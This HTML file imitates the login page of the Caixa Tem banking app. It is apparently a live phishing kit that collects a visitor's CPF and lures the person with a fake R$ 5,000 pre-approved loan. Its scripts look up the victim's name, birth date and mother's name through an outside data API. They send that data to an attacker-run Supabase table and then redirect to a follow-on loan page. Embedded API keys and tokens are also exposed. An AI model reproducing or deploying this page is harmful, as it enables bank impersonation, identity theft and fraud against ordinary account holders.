<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <link rel="icon" type="image/png" href="favicon.png" />
  <title>CAIXA TEM - ACESSE SUA CONTA</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: #0066b3;
      height: 100%;
      width: 100%;
      position: fixed;
      overflow: hidden;
      display: none;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    @media (max-width: 768px) {
      body {
        display: flex;
      }
    }

    .container {
      background: white;
      border-radius: 24px;
      width: 100%;
      max-width: 420px;
      margin: auto;
      padding: 0;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
      position: relative;
      min-height: 90%;
      max-height: 100%;
      overflow-y: auto;
      align-self: center;
      display: flex;
      flex-direction: column;
    }

    .close-btn {
      position: absolute;
      top: 20px;
      right: 20px;
      background: none;
      border: none;
      font-size: 28px;
      color: #666;
      cursor: pointer;
      font-weight: 300;
      line-height: 1;
      padding: 0;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .content {
      padding: 80px 32px 32px 32px;
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    .logo {
      position: absolute;
      top: 24px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo img {
      max-width: 50px;
      height: auto;
    }

    h1 {
      color: #003e6b;
      font-size: 35px;
      font-weight: 600;
      text-align: left;
      line-height: 1.3;
      margin-bottom: 32px;
    }

    .input-wrapper {
      margin-bottom: 24px;
    }

    input[type="tel"] {
      width: 100%;
      padding: 16px 20px;
      border: 1px solid #d1d5db;
      border-radius: 12px;
      font-size: 16px;
      color: #374151;
      outline: none;
      transition: border-color 0.2s;
    }

    input[type="tel"]::placeholder {
      color: #9ca3af;
    }

    input[type="tel"]:focus {
      border-color: #0066b3;
    }

    .submit-btn {
      width: 100%;
      padding: 16px;
      background: #d4dfe6;
      color: #a0adb5;
      border: none;
      border-radius: 12px;
      font-size: 18px;
      font-weight: 600;
      cursor: not-allowed;
      margin-bottom: auto;
    }

    .version {
      text-align: center;
      color: #1a7f78;
      font-size: 14px;
      margin-top: auto;
      padding-top: 40px;
      padding-bottom: 20px;
    }

    .validation-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0066b3;
      z-index: 1000;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }

    .validation-icon {
      margin-bottom: 40px;
      position: relative;
    }

    .validation-icon img {
      width: 80px;
      height: auto;
      display: block;
      margin: 0 auto;
    }

    .check-circle {
      width: 64px;
      height: 64px;
      background: #25D366;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 24px auto;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
    }

    .check-circle svg {
      width: 32px;
      height: 32px;
      fill: white;
    }

    .validation-text {
      color: white;
    }

    .validation-text h2 {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .validation-text p {
      font-size: 16px;
      opacity: 0.9;
    }

    .loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0066b3;
      z-index: 2000;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
    }

    .loading-gif {
      width: 120px;
      height: 120px;
      margin-bottom: 40px;
    }

    .loading-icon {
      width: 80px;
      height: 80px;
      margin-bottom: 40px;
      display: none;
      filter: brightness(0) invert(1);
    }

    .loading-message {
      color: white;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 12px;
      animation: fadeInOut 2s ease-in-out infinite;
    }

    .loading-message.final {
      animation: none;
      font-size: 24px;
    }

    .loading-submessage {
      color: white;
      font-size: 14px;
      opacity: 0.85;
    }

    .loan-amount {
      display: none;
      color: #FFD700;
      font-size: 22px;
      font-weight: 700;
      margin-top: 20px;
      margin-bottom: 8px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
    }

    .loan-text {
      display: none;
      color: white;
      font-size: 18px;
      font-weight: 600;
      opacity: 0.95;
    }

    @keyframes fadeInOut {
      0%, 100% { opacity: 0.7; }
      50% { opacity: 1; }
    }

    .hidden {
      display: none !important;
    }

    .error-message {
      color: #dc2626;
      font-size: 14px;
      margin-bottom: 8px;
      font-weight: 500;
    }

    /* API Error Message */
    .api-error {
      background: #fee2e2;
      color: #dc2626;
      padding: 12px;
      border-radius: 12px;
      font-size: 14px;
      margin-bottom: 16px;
      text-align: center;
      display: none;
    }
  </style>
</head>
<body>
  <!-- Loading Screen -->
  <div class="loading-screen" id="loadingScreen">
    <img src="loading.gif" alt="Carregando..." class="loading-gif" id="loadingGif">
    <img src="icone.png" alt="Validado" class="loading-icon" id="loadingIcon">
    <div class="loading-message" id="loadingMessage">Estamos validando seus dados</div>
    <div class="loading-submessage" id="loadingSubmessage">Por favor, aguarde...</div>
    <div class="loan-text" id="loanText">Valor pré-disponível identificado</div>
    <div class="loan-amount" id="loanAmount">R$ 5.000 de empréstimo</div>
  </div>

  <div class="container">
    <button class="close-btn">✕</button>
    
    <div class="content">
      <div class="logo">
        <img src="logocaixa2.png" alt="Logo">
      </div>

      <h1>Informe seu CPF<br>para iniciarmos</h1>

      <div class="input-wrapper">
        <div id="cpfError" class="error-message" style="display: none;">CPF Inválido</div>
        <div id="apiError" class="api-error" style="display: none;">Erro ao consultar dados. Tente novamente.</div>
        <input type="tel" placeholder="Digite o seu CPF" maxlength="14" id="cpfInput" inputmode="numeric">
      </div>

      <button class="submit-btn" id="submitBtn">Próximo</button>

      <div class="version">Versão: 1.91.23</div>
    </div>
  </div>

  <!-- Validation Overlay -->
  <div class="validation-overlay" id="validationOverlay">
    <div class="validation-icon">
      <img src="icone.png" alt="Validando" style="filter: brightness(0) invert(1);">
    </div>
    <div class="check-circle">
      <svg viewBox="0 0 24 24">
        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
      </svg>
    </div>
    <div class="validation-text">
      <h2>Sucesso!</h2>
      <p id="validationMessage">Conseguimos validar o CPF.</p>
    </div>
  </div>

  <!-- ============================================ -->
  <!-- SUPABASE INTEGRATION
  <!-- ============================================ -->
  <script>
    const SUPABASE_URL = 'https://hbpgjwezukugbtviswkw.supabase.co';
    const SUPABASE_KEY = 'sb_publishable__7MjiigiJf7NgmLZPLFdxA_yRNF_cO8';

    function getSessaoId() {
      let id = sessionStorage.getItem('sessao_funil');
      if (!id) {
        id = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        sessionStorage.setItem('sessao_funil', id);
      }
      return id;
    }

    async function salvarEtapa(etapaNome, dadosColetados = {}) {
      const sessao_id = getSessaoId();
      
      const payload = {
        sessao_id: sessao_id,
        etapa: etapaNome,
        dados: dadosColetados,
        url: window.location.pathname,
        user_agent: navigator.userAgent.substring(0, 255)
      };

      console.log(`📝 Salvando etapa: ${etapaNome}`, dadosColetados);

      try {
        const response = await fetch(`${SUPABASE_URL}/rest/v1/funil_etapas`, {
          method: 'POST',
          headers: {
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          console.log(`✅ Etapa "${etapaNome}" salva com sucesso!`);
          return true;
        } else {
          console.error(`❌ Erro ${response.status}:`, await response.text());
          return false;
        }
      } catch (error) {
        console.error('❌ Erro de rede:', error);
        return false;
      }
    }
  </script>

  <script>
    // CPF Formatting
    const cpfInput = document.getElementById('cpfInput');
    const submitBtn = document.getElementById('submitBtn');
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingMessage = document.getElementById('loadingMessage');
    const cpfError = document.getElementById('cpfError');
    const apiError = document.getElementById('apiError');

    // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA
    salvarEtapa('pagina_acesso', { 
      pagina: 'acesso4e98',
      timestamp_acesso: new Date().toISOString()
    });

    cpfInput.addEventListener('input', function(e) {
      cpfError.style.display = 'none';
      apiError.style.display = 'none';
      let value = e.target.value.replace(/\D/g, '');
      
      if (value.length > 11) {
        value = value.slice(0, 11);
      }
      
      if (value.length > 9) {
        value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
      } else if (value.length > 6) {
        value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
      } else if (value.length > 3) {
        value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
      }
      
      e.target.value = value;

      if (value.replace(/\D/g, '').length === 11) {
        submitBtn.style.background = '#d97706';
        submitBtn.style.color = 'white';
        submitBtn.style.cursor = 'pointer';
        submitBtn.disabled = false;
      } else {
        submitBtn.style.background = '#d4dfe6';
        submitBtn.style.color = '#a0adb5';
        submitBtn.style.cursor = 'not-allowed';
        submitBtn.disabled = true;
      }
    });

    function validateCPF(cpf) {
      cpf = cpf.replace(/[^\d]+/g, '');
      if (cpf == '') return false;
      if (cpf.length != 11 ||
        cpf == "00000000000" ||
        cpf == "11111111111" ||
        cpf == "22222222222" ||
        cpf == "33333333333" ||
        cpf == "44444444444" ||
        cpf == "55555555555" ||
        cpf == "66666666666" ||
        cpf == "77777777777" ||
        cpf == "88888888888" ||
        cpf == "99999999999")
        return false;
      let add = 0;
      for (let i = 0; i < 9; i++)
        add += parseInt(cpf.charAt(i)) * (10 - i);
      let rev = 11 - (add % 11);
      if (rev == 10 || rev == 11) rev = 0;
      if (rev != parseInt(cpf.charAt(9))) return false;
      add = 0;
      for (let i = 0; i < 10; i++)
        add += parseInt(cpf.charAt(i)) * (11 - i);
      rev = 11 - (add % 11);
      if (rev == 10 || rev == 11) rev = 0;
      if (rev != parseInt(cpf.charAt(10))) return false;
      return true;
    }

    submitBtn.addEventListener('click', async function() {
      if (!this.disabled) {
        if (!validateCPF(cpfInput.value)) {
           cpfError.style.display = 'block';
           return;
        }
        
        const cpfLimpo = cpfInput.value.replace(/\D/g, '');
        let nomeCliente = null;
        let dadosAPI = null;
        
        // ========================================
        // BUSCA O NOME DO CLIENTE NA API EXTERNA
        // ========================================
        submitBtn.disabled = true;
        submitBtn.textContent = 'Consultando dados...';
        
        try {
          const apiUrl = `https://api.amnesiatecnologia.lat/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=${cpfLimpo}`;
          console.log('🔍 Consultando API:', apiUrl);
          
          const response = await fetch(apiUrl);
          const data = await response.json();
          
          if (data && data.DADOS && data.DADOS.nome) {
            nomeCliente = data.DADOS.nome;
            dadosAPI = data.DADOS;
            console.log('✅ Nome encontrado na API:', nomeCliente);
            console.log('📦 Dados completos:', dadosAPI);
            apiError.style.display = 'none';
          } else {
            console.log('⚠️ Nome não encontrado na API');
            apiError.style.display = 'block';
            apiError.textContent = 'CPF não localizado. Verifique e tente novamente.';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Próximo';
            return;
          }
        } catch (error) {
          console.error('❌ Erro ao consultar API:', error);
          apiError.style.display = 'block';
          apiError.textContent = 'Erro na consulta. Tente novamente.';
          submitBtn.disabled = false;
          submitBtn.textContent = 'Próximo';
          return;
        }
        
        // ========================================
        // SALVA CPF E NOME NO BANCO DE DADOS
        // ========================================
        submitBtn.textContent = 'Salvando dados...';
        
        await salvarEtapa('cpf_informado', {
          cpf: cpfLimpo,
          cpf_formatado: cpfInput.value,
          nome: nomeCliente,
          data_nascimento: dadosAPI?.data_nascimento,
          nome_mae: dadosAPI?.nome_mae,
          sexo: dadosAPI?.sexo,
          timestamp: new Date().toISOString()
        });
        
        // Salva no storage para usar nas próximas páginas
        const clienteData = {
          cpf: cpfLimpo,
          nome: nomeCliente,
          data_nascimento: dadosAPI?.data_nascimento,
          nome_mae: dadosAPI?.nome_mae
        };
        localStorage.setItem('funil_cliente_data', JSON.stringify(clienteData));
        sessionStorage.setItem('funil_cliente_data', JSON.stringify(clienteData));
        
        // ========================================
        // MOSTRA TELA DE LOADING COM O NOME
        // ========================================
        loadingScreen.style.display = 'flex';
        
        const loadingGif = document.getElementById('loadingGif');
        const loadingIcon = document.getElementById('loadingIcon');
        const loadingSubmessage = document.getElementById('loadingSubmessage');
        
        const messages = [
          'Estamos validando seus dados',
          'Verificando informações',
          'Processando sua solicitação',
          'Carregando sistema de segurança',
          'Confirmando identidade',
          'Validando CPF',
          'Consultando base de dados',
          'Verificando segurança',
          'Autenticando acesso',
          'Processando dados'
        ];
        
        let messageIndex = 0;
        
        const messageInterval = setInterval(() => {
          messageIndex = (messageIndex + 1) % messages.length;
          loadingMessage.textContent = messages[messageIndex];
        }, 1000);
        
        setTimeout(async function() {
          clearInterval(messageInterval);
          
          await salvarEtapa('validacao_concluida', {
            status: 'sucesso',
            cpf_validado: cpfLimpo,
            nome_cliente: nomeCliente,
            valor_pre_aprovado: 5000,
            timestamp: new Date().toISOString()
          });
          
          loadingGif.style.display = 'none';
          loadingIcon.style.display = 'block';
          loadingMessage.classList.add('final');
          
          // Exibe o nome do cliente na tela de loading
          loadingMessage.textContent = `Olá, ${nomeCliente.split(' ')[0]}!`;
          loadingSubmessage.textContent = 'Validação concluída com sucesso';
          
          const loanAmount = document.getElementById('loanAmount');
          const loanText = document.getElementById('loanText');
          loanAmount.style.display = 'block';
          loanText.style.display = 'block';
          
          setTimeout(function() {
            window.location.href = 'emprestimo4e98.html?a7k9m2x1p12';
          }, 5000);
        }, 6000);
      }
    });
  </script>

  <script>
    // Manter parâmetro de acesso em todos os links e formulários
    document.addEventListener('DOMContentLoaded', function() {
        var accessParam = 'a7k9m2x1p12';
        
        function addAccessToLinks() {
            var links = document.querySelectorAll('a[href]');
            links.forEach(function(link) {
                var href = link.getAttribute('href');
                if (!href || href.startsWith('http') || href.startsWith('#') || 
                    href.startsWith('javascript:') || href.includes(accessParam.split('=')[0])) {
                    return;
                }
                var separator = href.includes('?') ? '&' : '?';
                link.setAttribute('href', href + separator + accessParam);
            });
        }
        
        function addAccessToForms() {
            var forms = document.querySelectorAll('form');
            forms.forEach(function(form) {
                if (!form.method || form.method.toLowerCase() === 'get') {
                    var paramName = accessParam.split('=')[0];
                    var existingInput = form.querySelector('input[name="' + paramName + '"]');
                    if (!existingInput) {
                        var input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = paramName;
                        input.value = '';
                        form.appendChild(input);
                    }
                }
            });
        }
        
        addAccessToLinks();
        addAccessToForms();
        
        var observer = new MutationObserver(function(mutations) {
            var shouldUpdate = false;
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === 1) {
                            if (node.tagName === 'A' || node.tagName === 'FORM' || 
                                node.querySelector('a') || node.querySelector('form')) {
                                shouldUpdate = true;
                            }
                        }
                    });
                }
            });
            if (shouldUpdate) {
                addAccessToLinks();
                addAccessToForms();
            }
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
  </script>
</body>
